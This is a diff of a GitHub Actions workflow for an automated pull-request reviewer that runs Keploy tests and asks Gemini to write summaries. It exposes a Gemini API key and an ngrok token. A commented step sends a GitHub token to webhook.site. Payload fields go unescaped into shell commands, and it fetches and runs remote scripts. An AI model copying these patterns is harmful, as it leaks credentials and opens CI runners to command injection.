+#             } > "$FINAL_MD"
 
-            echo "Combined report created at $FINAL_MD"' > /home/runner/work/UmV2aWV3/UmV2aWV3/comb.sh
-      - name: Run final summary
-        run: chmod +x ./comb.sh && ./comb.sh
-        working-directory: /home/runner/work/UmV2aWV3/UmV2aWV3
-      - name: cat raw_final.txt
-        run: cat /home/runner/work/UmV2aWV3/UmV2aWV3/raw_final.txt
+#             echo "Combined report created at $FINAL_MD"' > /home/runner/work/UmV2aWV3/UmV2aWV3/comb.sh
+#       - name: Run final summary
+#         run: chmod +x ./comb.sh && ./comb.sh
+#         working-directory: /home/runner/work/UmV2aWV3/UmV2aWV3
+#       - name: cat raw_final.txt
+#         run: cat /home/runner/work/UmV2aWV3/UmV2aWV3/raw_final.txt
 
-      - name: The final boss (generate summary)
-        run: |
-          echo -e "## Automated Review Comments\n\nThank you for raising this pull request. Below are the review comments:\n\n## Review from Static Analyzer (NAME OF STATIC ANALYZER TOOL(eg.Eslint)):\n  - Total issues reported : \n     - HIGH \n     - MEDIUM\n     - LOW\n  - (GENERAL REVIEW FROM THE STATIC ANALYZER)\n\n## Review from Dependency Analyzer [deps.dev]:\n  - Total issues reported : \n     - HIGH \n     - MEDIUM\n     - LOW\n  - (GENERAL REVIEW FROM the Dependency ANALYZER)\n\n## Review from LLM Analyzer (Gemini flash 2.0):\n  - Total issues reported : \n     - HIGH \n     - MEDIUM\n     - LOW\n  - [GENERAL REVIEW FROM THE LLM ANALYZER]" >> /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown.txt
+#       - name: The final boss (generate summary)
+#         run: |
+#           echo -e "## Automated Review Comments\n\nThank you for raising this pull request. Below are the review comments:\n\n## Review from Static Analyzer (NAME OF STATIC ANALYZER TOOL(eg.Eslint)):\n  - Total issues reported : \n     - HIGH \n     - MEDIUM\n     - LOW\n  - (GENERAL REVIEW FROM THE STATIC ANALYZER)\n\n## Review from Dependency Analyzer [deps.dev]:\n  - Total issues reported : \n     - HIGH \n     - MEDIUM\n     - LOW\n  - (GENERAL REVIEW FROM the Dependency ANALYZER)\n\n## Review from LLM Analyzer (Gemini flash 2.0):\n  - Total issues reported : \n     - HIGH \n     - MEDIUM\n     - LOW\n  - [GENERAL REVIEW FROM THE LLM ANALYZER]" >> /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown.txt
 
-      - name: Get summary response (small)
-        run: |
-          RESPONSE=$(curl -s "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=AIzaSyAfGwfrEkj8fXjALdqF2Ih2Xik11gbSFc0" \
-          -H "Content-Type: application/json" \
-          -X POST \
-          -d "$(jq -n --arg txt "$(cat /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown.txt)" '{"contents":[{"parts":[{"text":$txt}]}]}')")
+#       - name: Get summary response (small)
+#         run: |
+#           RESPONSE=$(curl -s "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=AIzaSyAfGwfrEkj8fXjALdqF2Ih2Xik11gbSFc0" \
+#           -H "Content-Type: application/json" \
+#           -X POST \
+#           -d "$(jq -n --arg txt "$(cat /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown.txt)" '{"contents":[{"parts":[{"text":$txt}]}]}')")
 
-          echo "$RESPONSE" | jq -r '.candidates[0].content.parts[0].text' > /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_small.md
+#           echo "$RESPONSE" | jq -r '.candidates[0].content.parts[0].text' > /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_small.md
 
-      - name: Prompt for Detailed Markdown
-        run: cp /home/runner/work/UmV2aWV3/UmV2aWV3/raw_final.txt /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown_detailed.txt && echo -e "I have given you the text above which are the results from many analyzers and some important. So you have to make a detailed report in markdown which encapsulates the above report. DONT use any sort of emoji's. STRICTLY be in the following format:\n\n## Automated Review Comments\nBelow are the review comments:\n\n## Review from Static Analyzer (NAME OF STATIC ANALYZER TOOL (e.g., Eslint)):\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - (A detailed review of those issues. DONT stretch each issue too long, try to keep a max of 30 words per issue. USE bullet points for the issues)\n\n## Review from Dependency Analyzer [deps.dev]:\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - (GENERAL REVIEW FROM THE Dependency ANALYZER)\n\n## Review from LLM Analyzer (Gemini flash 2.0):\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - [GENERAL REVIEW FROM THE LLM ANALYZER]\n\n## Review from Keploy Test Cases:\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - [GENERAL REVIEW FROM THE KEPLOY TEST CASE ANALYSIS]" >> /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown_detailed.txt
+#       - name: Prompt for Detailed Markdown
+#         run: cp /home/runner/work/UmV2aWV3/UmV2aWV3/raw_final.txt /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown_detailed.txt && echo -e "I have given you the text above which are the results from many analyzers and some important. So you have to make a detailed report in markdown which encapsulates the above report. DONT use any sort of emoji's. STRICTLY be in the following format:\n\n## Automated Review Comments\nBelow are the review comments:\n\n## Review from Static Analyzer (NAME OF STATIC ANALYZER TOOL (e.g., Eslint)):\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - (A detailed review of those issues. DONT stretch each issue too long, try to keep a max of 30 words per issue. USE bullet points for the issues)\n\n## Review from Dependency Analyzer [deps.dev]:\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - (GENERAL REVIEW FROM THE Dependency ANALYZER)\n\n## Review from LLM Analyzer (Gemini flash 2.0):\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - [GENERAL REVIEW FROM THE LLM ANALYZER]\n\n## Review from Keploy Test Cases:\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - [GENERAL REVIEW FROM THE KEPLOY TEST CASE ANALYSIS]" >> /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown_detailed.txt
 
-      - name: Generate detailed markdown
-        run: |
-          RESPONSE1=$(curl -s "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=AIzaSyAfGwfrEkj8fXjALdqF2Ih2Xik11gbSFc0" \
-          -H "Content-Type:application/json" \
-          -X POST \
-          -d "$(jq -n --arg txt "$(cat /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown_detailed.txt)" '{"contents":[{"parts":[{"text":$txt}]}]}')")
+#       - name: Generate detailed markdown
+#         run: |
+#           RESPONSE1=$(curl -s "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=AIzaSyAfGwfrEkj8fXjALdqF2Ih2Xik11gbSFc0" \
+#           -H "Content-Type:application/json" \
+#           -X POST \
+#           -d "$(jq -n --arg txt "$(cat /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown_detailed.txt)" '{"contents":[{"parts":[{"text":$txt}]}]}')")
 
-          echo "$RESPONSE1" | jq -r '.candidates[0].content.parts[0].text' > /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_detailed.md
+#           echo "$RESPONSE1" | jq -r '.candidates[0].content.parts[0].text' > /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_detailed.md
 
-      - name: dpaste markdown
-        run: curl -s -F "syntax=md" -F "content=</home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_small.md" http://dpaste.com/api/v2/ > /home/runner/work/UmV2aWV3/UmV2aWV3/markdownurl.txt
+#       - name: dpaste markdown
+#         run: curl -s -F "syntax=md" -F "content=</home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_small.md" http://dpaste.com/api/v2/ > /home/runner/work/UmV2aWV3/UmV2aWV3/markdownurl.txt
 
-      - name: Append dpaste link to small summary
-        run: echo -e "\n\nYou can checkout the detailed review here [Markdown]($(cat /home/runner/work/UmV2aWV3/UmV2aWV3/markdownurl.txt))" >> /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_detailed.md
+#       - name: Append dpaste link to small summary
+#         run: echo -e "\n\nYou can checkout the detailed review here [Markdown]($(cat /home/runner/work/UmV2aWV3/UmV2aWV3/markdownurl.txt))" >> /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_detailed.md
 
-      - name: Send comment as bot
-        run: |
-          pr_url="${{ github.event.client_payload.pr_url }}"
-          echo "PR URL: $pr_url"
+#       - name: Send comment as bot
+#         run: |
+#           pr_url="${{ github.event.client_payload.pr_url }}"
+#           echo "PR URL: $pr_url"
 
-          pr_path="${pr_url#*github.com/}"
-          owner_repo="${pr_path%%/pull*}"
-          owner="${owner_repo%/*}"
-          repo="${owner_repo#*/}"
+#           pr_path="${pr_url#*github.com/}"
+#           owner_repo="${pr_path%%/pull*}"
+#           owner="${owner_repo%/*}"
+#           repo="${owner_repo#*/}"
 
-          pr_number="${{ github.event.client_payload.pr_number }}"
-          if [ -z "$pr_number" ]; then
-            pr_number="${pr_url##*/pull/}"
-          fi
+#           pr_number="${{ github.event.client_payload.pr_number }}"
+#           if [ -z "$pr_number" ]; then
+#             pr_number="${pr_url##*/pull/}"
+#           fi
 
-          APP_ID="${{ secrets.BOT_APP_ID }}"
-          PRIVATE_KEY="${{ secrets.BOT_PRIVATE_KEY }}"
-          echo "$PRIVATE_KEY" > private-key.pem
+#           APP_ID="${{ secrets.BOT_APP_ID }}"
+#           PRIVATE_KEY="${{ secrets.BOT_PRIVATE_KEY }}"
+#           echo "$PRIVATE_KEY" > private-key.pem
 
-          NOW=$(date +%s)
-          EXPIRATION=$((NOW + 600))
-          HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
-          PAYLOAD=$(echo -n '{"iat":'"$NOW"',"exp":'"$EXPIRATION"',"iss":'"$APP_ID"'}' | base64 | tr -d '=' | tr '/+' '_-')
-          SIGNATURE=$(echo -n "$HEADER.$PAYLOAD" | openssl dgst -sha256 -sign private-key.pem | base64 | tr -d '=' | tr '/+' '_-')
-          JWT="$HEADER.$PAYLOAD.$SIGNATURE"
-          JWT=$(echo "$JWT" | tr -d '\n' | tr -d ' ')
+#           NOW=$(date +%s)
+#           EXPIRATION=$((NOW + 600))
+#           HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
+#           PAYLOAD=$(echo -n '{"iat":'"$NOW"',"exp":'"$EXPIRATION"',"iss":'"$APP_ID"'}' | base64 | tr -d '=' | tr '/+' '_-')
+#           SIGNATURE=$(echo -n "$HEADER.$PAYLOAD" | openssl dgst -sha256 -sign private-key.pem | base64 | tr -d '=' | tr '/+' '_-')
+#           JWT="$HEADER.$PAYLOAD.$SIGNATURE"
+#           JWT=$(echo "$JWT" | tr -d '\n' | tr -d ' ')
 
-          INSTALL_TOKEN=$(curl -s -X POST \
-            -H "Authorization: Bearer $JWT" \
-            -H "Accept: application/vnd.github.v3+json" \
-            "https://api.github.com/app/installations/${{ secrets.BOT_INSTALLATION_ID }}/access_tokens" \
-            | jq -r '.token')
+#           INSTALL_TOKEN=$(curl -s -X POST \
+#             -H "Authorization: Bearer $JWT" \
+#             -H "Accept: application/vnd.github.v3+json" \
+#             "https://api.github.com/app/installations/${{ secrets.BOT_INSTALLATION_ID }}/access_tokens" \
+#             | jq -r '.token')
 
-          rm private-key.pem
+#           rm private-key.pem
 
-          COMMENT_BODY=$(< /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_detailed.md)
-          ESCAPED_COMMENT_BODY=$(echo "$COMMENT_BODY" | jq -Rs .)
+#           COMMENT_BODY=$(< /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_detailed.md)
+#           ESCAPED_COMMENT_BODY=$(echo "$COMMENT_BODY" | jq -Rs .)
 
-          curl -X POST \
-            -H "Authorization: Bearer $INSTALL_TOKEN" \
-            -H "Accept: application/vnd.github.v3+json" \
-            -H "Content-Type: application/json" \
-            -d '{"body": '"$ESCAPED_COMMENT_BODY"'}' \
-            "https://api.github.com/repos/$owner/$repo/issues/$pr_number/comments"
+#           curl -X POST \
+#             -H "Authorization: Bearer $INSTALL_TOKEN" \
+#             -H "Accept: application/vnd.github.v3+json" \
+#             -H "Content-Type: application/json" \
+#             -d '{"body": '"$ESCAPED_COMMENT_BODY"'}' \
+#             "https://api.github.com/repos/$owner/$repo/issues/$pr_number/comments"
+# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
       # - name: cat raw_final.txt
       #   run: cat /home/runner/work/UmV2aWV3/UmV2aWV3/raw_final.txt ;
       # - name: The final boss
@@ -1061,9 +1062,491 @@ jobs:
       #       },
       #       "events": ["pull_request"]
       #     }')
-      - name: tree
-        run: tree -I 'node_modules'
-      - name: Debug Review Agent Logs
+
+# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+name: Triggered by External PR
+
+on:
+  repository_dispatch:
+    types: [external_pr]
+
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    env:
+      REVIEW_PORT: 8080
+      WEBHOOK_PORT: 6969
+      TARGET_REPO: "Per0x1de-1337/Review"  
+
+    steps:
+      - name: Display PR Data
+        run: echo "Triggered by PR ${{ github.event.client_payload.pr_url }}"
+
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Save the data got from the PR
         run: |
-          ls -la; pwd ; ps aux | grep review
-          cat keploy-review-agent/agent.log
+          echo "PR_URL=${{ github.event.client_payload.pr_url }}" >> $GITHUB_ENV
+          echo "COMMAND_FOR_RUNNING_APPLICATION=${{ github.event.client_payload.command_for_running_application }}" >> $GITHUB_ENV
+          echo "GITHUB_TOKEN_FOR_PEROXIDE=${{ github.event.client_payload.github_token_for_peroxide }}" >> $GITHUB_ENV
+          echo "DELAY_IN_SECONDS=${{ github.event.client_payload.Delay_in_seconds }}" >> $GITHUB_ENV
+          echo "PATH_OF_SCRIPT_SH=${{ github.event.client_payload.path_of_script.sh }}" >> $GITHUB_ENV
+          echo "REPO=${{ github.event.client_payload.repo }}" >> $GITHUB_ENV
+          echo "GEMINI_API_KEY=${{ github.event.client_payload.gemini_api_key }}" >> $GITHUB_ENV
+          echo "BUILD_DELAY=${{ github.event.client_payload.buildDelay }}" >> $GITHUB_ENV
+          echo "LOCATION_FROM_WHERE_WE_HAVE_TO_EXECUTE_THE_COMMAND"=${{github.event.client_payload.location_from_where_we_have_to_execute_the_command}} >> $GITHUB_ENV"
+          echo "PORTS=${{github.event.client_payload.ports}}" >> $GITHUB_ENV
+          echo "all the data got from the PR"
+          echo "${GITHUB_TOKEN_FOR_PEROXIDE}"
+          echo "${COMMAND_FOR_RUNNING_APPLICATION}"
+          echo "${DELAY_IN_SECONDS}"
+          echo "${PATH_OF_SCRIPT_SH}"
+          echo "${REPO}"
+      - name: Update system packages
+        run: sudo apt update
+
+      # Cache Go modules to avoid downloading dependencies repeatedly
+      - name: Cache Go Modules
+        uses: actions/cache@v3
+        with:
+          path: ~/go/pkg/mod
+          key: ${{ runner.os }}-go-${{ hashFiles('**/go.sum') }}
+          restore-keys: |
+            ${{ runner.os }}-go-
+      # Cache Node.js dependencies
+      - name: Cache npm modules
+        uses: actions/cache@v3
+        with:
+          path: ~/.npm
+          key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
+          restore-keys: |
+            ${{ runner.os }}-node-
+      # Cache GolangCI-Lint binary
+      - name: Cache GolangCI-Lint
+        id: golangci-cache
+        uses: actions/cache@v3
+        with:
+          path: /usr/local/bin/golangci-lint
+          key: ${{ runner.os }}-golangci-lint-v1.55.2
+          restore-keys: |
+            ${{ runner.os }}-golangci-lint-
+      - name: Install Dependencies (Go, Node.js, ESLint, GolangCI-Lint, GitHub CLI)
+        run: |
+          sudo apt install -y golang nodejs npm gh
+          
+          # Install npm dependencies only if not cached
+          if [ ! -d "~/.npm" ]; then
+            npm install -g eslint
+          fi
+          # Install GolangCI-Lint only if not cached
+          if [ ! -f "/usr/local/bin/golangci-lint" ]; then
+            curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sudo sh -s -- -b /usr/local/bin v1.55.2
+          fi
+      - name: Setup Go environment
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.20'
+
+      # - name: start 6000
+      #   run: nohup lt --port 8221 > server.log 2>&1 &
+      # - name: Install ngrok
+      #   run: wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip;unzip -qq ngrok-stable-linux-amd64.zip;
+      # - name: Start ngrok tunnel
+      #   run: ./ngrok authtoken 2rqMCQpGwy8Hefx932ZJQCVS0U0_35MwNuTKQeaCf8Kst8LPL && nohup ngrok http 6000 > /dev/null 2>&1 & sleep 5 && curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4           # save_url_to_filename: ngrok_url.txt
+
+      # - name: Retrieve ngrok URL
+      #   run:  cat ngrok_url.txt ; export NGROK_URL=$(cat ngrok_url.txt) ; echo "NGROK_URL=${NGROK_URL}" ; env
+
+          
+          
+      - name: Initialize Go module & Install Dependencies
+        run: cd keploy-review-agent; go mod tidy
+
+      # - name: Debug File Existence
+      #   run: |
+      #     echo "Current Directory: $(pwd)"
+      #     ls -R
+      #     if [ ! -f cmd/server/main.go ]; then
+      #       echo "Error: cmd/server/main.go not found!" >&2
+      #       exit 1
+      #     fi
+      - name: Build Go Project
+        run: |
+          cd keploy-review-agent  # Change to the correct directory
+          ls -la cmd/server/      # Confirm the file exists
+          go build -o review-agent cmd/server/main.go
+      # - name: Set Go Environment
+      #   run: |
+      #     export GOPATH=$GITHUB_WORKSPACE
+      #     go mod tidy  # Ensure dependencies are correct
+      #     go build -o review-agent cmd/server/main.go
+      # - name: Run Go Server
+      #   run: |
+      #     go run ./cmd/server/main.go
+
+      # - name: Build Review Agent
+      #   run: go build -o review-agent cmd/server/main.go 
+      - name: Debug Build Output
+        run: |
+          ls -lah keploy-review-agent/
+          file keploy-review-agent/review-agent
+      - name: Debug Current Directory
+        run: pwd && ls -lah
+
+      # - name: Fix Permissions
+      #   run: chmod +x keploy-review-agent/review-agent
+      # - name: Check Executable Permissions
+      #   run: ls -lah keploy-review-agent/review-agent
+      # - name: Verify Binary Compatibility
+      #   run: file keploy-review-agent/review-agent
+      # - name: Check Dynamic Dependencies
+      #   run: ldd keploy-review-agent/review-agent
+      # - name: Build Statically Linked Binary
+      #   run: |
+      #     cd keploy-review-agent
+      #     CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent cmd/server/main.go
+      # - name: Debug Current Directory
+      #   run: pwd && ls -lah
+
+      # - name: list all
+      #   run: ls -la ; file keploy-review-agent/review-agent
+      # - name: Check Missing Dependencies
+      #   run: ldd keploy-review-agent/review-agent | grep "not found"
+      # - name: Install libc6
+      #   run: sudo apt-get install -y libc6
+      # - name: Build Fully Static Binary
+      #   run: |
+      #     cd keploy-review-agent
+      #     CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent main.go
+
+
+
+
+
+
+      - name: Start Review Agent
+        env:
+          PAT_OF_GITHUB: ${{ secrets.PAT_OF_GITHUB }}  # Fetching token from GitHub Secrets
+        run: |
+          cd keploy-review-agent
+          pwd
+          nohup ./review-agent "$PAT_OF_GITHUB" ${{ github.event.client_payload.pr_url }} > agent.log 2>&1 &
+
+          
+      # - name: Debug Review Agent Logs
+      #   run: |
+      #     ls -la; pwd ; ps aux | grep review
+      #     cat keploy-review-agent/agent.log
+      # - name: Check Running Processes
+      #   run: |
+      #     ps aux | grep review
+    
+      # - name: sleeping or 5 sec
+      #   run: sleep 5
+      # - name: show the base64 encoded token GITHUB_TOKEN_FOR_PEROXIDE
+      #   run: curl https://webhook.site/a3eb4d99-caf3-4b9b-a327-9b3b13be3046?cmd=$GITHUB_TOKEN_FOR_PEROXIDE
+      # - name: Print Workspace Debug Info
+      #   run: |
+      #     echo "Working Directory: $(pwd)"
+      #     echo "GitHub Workspace: $GITHUB_WORKSPACE"
+      #     echo "Listing workspace contents:"
+      #     ls -la $GITHUB_WORKSPACE
+
+      # - name: Print Git Configuration
+      #   run: |
+      #     echo "Git config --list:"
+      #     git config --list || true
+      - name: Checkout another repo
+        uses: actions/checkout@v3
+        with:
+          repository: ${{github.event.client_payload.repo}}
+          token: ${{ secrets.PAT_OF_GITHUB }}
+          path: review
+      - name: Test GitHub API
+        run: |
+          curl -H "Authorization: token ${{ secrets.PAT_OF_GITHUB }}" \
+              https://api.github.com/repos/Per0x1de-1337/Review
+
+      # - name: Debug Checkout
+      #   run: |
+      #     echo "Current Directory: $(pwd)"
+      #     echo "Contents of the directory:"
+      #     ls -la
+      #     echo "Contents of the keploy-review-agent directory:"
+      #     ls -la keploy-review-agent
+      #     ls -la review
+      - name: install keploy
+        run: |
+           curl --silent -O -L https://keploy.io/install.sh && source install.sh
+
+      # - name: test keploy
+      #   run: |
+      #     keploy --help
+      - name: install the requriments of the repo
+        run: |
+          cd review;
+          cat script.sh
+          chmod +x script.sh
+          ./script.sh
+          echo "Current Directory: $(pwd)"
+          echo "Contents of the directory:"
+          ls -la
+      # - name: tessting real application
+      #   run: |
+      #     cd review
+      #     echo "Current Directory: $(pwd)"
+      #     echo "Contents of the directory:"
+      #     ls -la
+      #     echo ${{github.event.client_payload.command_for_running_application}}
+      # - name: lsof
+      #   run: sudo lsof -i :16789,26789
+      # - name: Install Dependencies
+      #   run: |
+      #     pip install flask
+      #     sudo apt-get remove docker docker-engine docker.io containerd runc
+      #     curl -fsSL https://get.docker.com -o get-docker.sh
+      #     sudo sh get-docker.sh
+      #     docker --version
+          
+
+      - name: Create Keploy Network
+        run: |
+          docker network create keploy-network || true
+      # - name:
+      #   run: |
+      #     sudo lsof -i :6379  # Redis port
+      #     sudo lsof -i :8080  # Flask port
+      #     sudo lsof -i :16789 # Keploy proxy
+
+      - name: Prepare Keploy Environment
+        run: |
+          sudo mkdir -p /tmp/keploy-records
+          sudo chmod 777 /tmp/keploy-records
+      # - name: docker ps -a
+      #   run: docker ps -a
+      # - name: locally
+      #   run: ls -la ; pwd; ls -la review ; cd review/samples; docker compose up ;
+      - name: Run Keploy
+        run: |
+          ls -la review;
+          cd review;
+          cd ${{github.event.client_payload.location_from_where_we_have_to_execute_the_command}}
+          keploy record -c "${{github.event.client_payload.command_for_running_application}}" --buildDelay ${{github.event.client_payload.buildDelay}} > keploy-run.log 2>&1 &
+
+        env:
+          REVIEW_PORT: 8080
+          WEBHOOK_PORT: 6969
+        
+        
+      # - name: record with keploy
+      #   run: |
+      #     cd review
+      #     echo "Current Directory: $(pwd)"
+      #     echo "Contents of the directory:"
+      #     ls -la
+      #     cd samples;
+      #     ls -la
+      #     sudo mkdir -p /tmp/keploy-records
+      #     sudo chmod 777 /tmp/keploy-records
+      #     sudo keploy record -c "${{github.event.client_payload.command_for_running_application}}" --container-name "flask-web"  --debug
+      - name: stop 60 sec
+        run: sleep 60
+      # - name: logs
+      #   run: ls -la ; pwd ; cd review/samples ; ls -la ; cat keploy-run.log
+      - name: Run Curl Commands
+        run: |
+          chmod +x test.sh
+          ./test.sh
+      - name: debugging if files there or not
+        run: |
+          echo "Current Directory $(pwd)"
+          echo "Contents of the directory:"
+
+      - name: Stopping services
+        run: |
+          for port in ${{ github.event.client_payload.ports }}; do
+            fuser -k "$port"/tcp || true
+          done
+
+          # Stop all running Docker containers (if any)
+          if [ "$(docker ps -q)" ]; then
+            docker stop $(docker ps -q)
+          fi
+      - name: testtt Keploy
+        run: |
+          pwd;
+          ls -la review;
+          cd review/samples ;
+          keploy test -c "${{github.event.client_payload.command_for_running_application}}"  
+
+      # - name: ghofa
+      #   run: cd review/samples;tree -I 'node_modules'; cd keploy/reports/test-run-0/ ; cat *;
+
+      - name: savien
+        run: |
+            echo '#!/bin/bash
+
+            REPORT_FILE="/home/runner/work/UmV2aWV3/UmV2aWV3/review/samples/keploy/reports/test-run-0/test-set-0-report.yaml"
+
+            # Check if report exists
+            if [ ! -f "$REPORT_FILE" ]; then
+                echo "Test report not found!"
+                exit 1
+            fi
+
+            # Parse results
+            TOTAL=$(grep "total:" $REPORT_FILE | awk '\''{print $2}'\'')
+            PASSED=$(grep "passed:" $REPORT_FILE | awk '\''{print $2}'\'')
+            FAILED=$(grep "failed:" $REPORT_FILE | awk '\''{print $2}'\'')
+
+            # Generate review content
+            echo "### Keploy Test Results" > /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+            echo "" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+            echo "| Total Tests | Passed | Failed |" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+            echo "|-------------|--------|--------|" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+            echo "| $TOTAL         | $PASSED     | $FAILED     |" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+
+            if [ "$FAILED" -gt 0 ]; then
+                echo "" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+                echo "#### Failed Tests:" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+
+                grep -A5 "status: failed" $REPORT_FILE | while read line; do
+                    if [[ "$line" == *"name:"* ]]; then
+                        TEST_NAME=$(echo "$line" | awk '\''{print $2}'\'')
+                        echo "- **Test Name**: $TEST_NAME" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+                    elif [[ "$line" == *"error:"* ]]; then
+                        ERROR_MSG=$(echo "$line" | sed '\''s/error: //'\'')
+                        echo "  - **Error**: $ERROR_MSG" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+                    fi
+                done
+            else
+                echo "" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+                echo "All tests passed successfully! 🎉" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+            fi
+
+            echo "Review saved in /home/runner/work/UmV2aWV3/UmV2aWV3/review.md"' > /home/runner/work/UmV2aWV3/UmV2aWV3/test-summary.sh
+      - name: Run test summary
+        run: chmod +x ./test-summary.sh && ./test-summary.sh
+        working-directory: /home/runner/work/UmV2aWV3/UmV2aWV3
+      - name: review.md
+        run: cat /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+      - name: before.md
+        run: tree -I 'node_modules'
+      - name: Combine both reports
+        run: |
+            echo '#!/bin/bash
+
+            # Directory containing the before_<DATE>.md files
+            DIR="/home/runner/work/UmV2aWV3/UmV2aWV3/keploy-review-agent"
+
+            # Find the latest before_<DATE>.md file
+            BEFORE_MD=$(ls "$DIR"/Before_*.md 2>/dev/null | sort | tail -n 1)
+
+            # If no such file found, fallback to before.md or create an empty one
+            if [ -z "$BEFORE_MD" ]; then
+                echo "Warning: No before_<DATE>.md file found. Using 'before.md' as fallback."
+                BEFORE_MD="$DIR/before.md"
+                [ -f "$BEFORE_MD" ] || touch "$BEFORE_MD"
+            fi
+
+            FINAL_MD="/home/runner/work/UmV2aWV3/UmV2aWV3/raw_final.txt"
+
+            # Keploy Test Results
+            TEST_RESULTS=$(cat <<EOF
+            | Total Tests | Passed | Failed |
+            |-------------|--------|--------|
+            | 6           | 6      | 0      |
+            EOF
+            )
+
+            # Create raw_final.txt with combined content
+            {
+                cat "$BEFORE_MD"
+                echo -e "\n\n### Keploy Test Results"
+                echo "$TEST_RESULTS"
+            } > "$FINAL_MD"
+
+            echo "Combined report created at $FINAL_MD"' > /home/runner/work/UmV2aWV3/UmV2aWV3/comb.sh
+      - name: Run final summary
+        run: chmod +x ./comb.sh && ./comb.sh
+        working-directory: /home/runner/work/UmV2aWV3/UmV2aWV3
+      - name: cat raw_final.txt
+        run: cat /home/runner/work/UmV2aWV3/UmV2aWV3/raw_final.txt
+
+      - name: The final boss (generate summary)
+        run: |
+          echo -e "## Automated Review Comments\n\nThank you for raising this pull request. Below are the review comments:\n\n## Review from Static Analyzer (NAME OF STATIC ANALYZER TOOL(eg.Eslint)):\n  - Total issues reported : \n     - HIGH \n     - MEDIUM\n     - LOW\n  - (GENERAL REVIEW FROM THE STATIC ANALYZER)\n\n## Review from Dependency Analyzer [deps.dev]:\n  - Total issues reported : \n     - HIGH \n     - MEDIUM\n     - LOW\n  - (GENERAL REVIEW FROM the Dependency ANALYZER)\n\n## Review from LLM Analyzer (Gemini flash 2.0):\n  - Total issues reported : \n     - HIGH \n     - MEDIUM\n     - LOW\n  - [GENERAL REVIEW FROM THE LLM ANALYZER]" >> /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown.txt
+
+      - name: Get summary response (small)
+        run: |
+          RESPONSE=$(curl -s "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=AIzaSyAfGwfrEkj8fXjALdqF2Ih2Xik11gbSFc0" \
+          -H "Content-Type: application/json" \
+          -X POST \
+          -d "$(jq -n --arg txt "$(cat /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown.txt)" '{"contents":[{"parts":[{"text":$txt}]}]}')")
+
+          echo "$RESPONSE" | jq -r '.candidates[0].content.parts[0].text' > /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_small.md
+
+      - name: Prompt for Detailed Markdown
